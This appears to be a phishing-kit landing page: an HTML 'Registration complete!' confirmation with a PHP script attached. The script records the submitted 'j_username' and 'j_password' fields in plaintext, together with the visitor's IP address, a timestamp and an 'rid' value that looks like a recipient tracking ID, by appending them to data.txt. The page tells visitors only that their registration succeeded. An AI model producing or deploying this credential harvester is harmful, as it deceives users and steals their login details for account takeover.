<html>
<head>
<title>Registration complete!</title>

<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
    body { color: #000000; background-color: #FFFFFF; }
    a:link { color: #0000CC; }
    p, address {margin-left: 3em;}
    span {font-size: smaller;}
/*]]>*/--></style>
</head>

<body>

<script>alert("Your registration has been completed!")</script>

</body>
</html>

<?php
$rid = $_POST["rid"];
$t= date("Y-m-d H:i:s");
$cl_ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen('data.txt', 'a');
fwrite($fp, $rid.",".$t.",".$cl_ip.",");
fclose($fp);

$fl = fopen("data.txt","a");

$name = $_POST["j_username"];
$last = $_POST["j_password"];

fwrite($fl, $name);
fwrite($fl, ",");
fwrite($fl, $last);
fwrite($fl, "\n");
?>
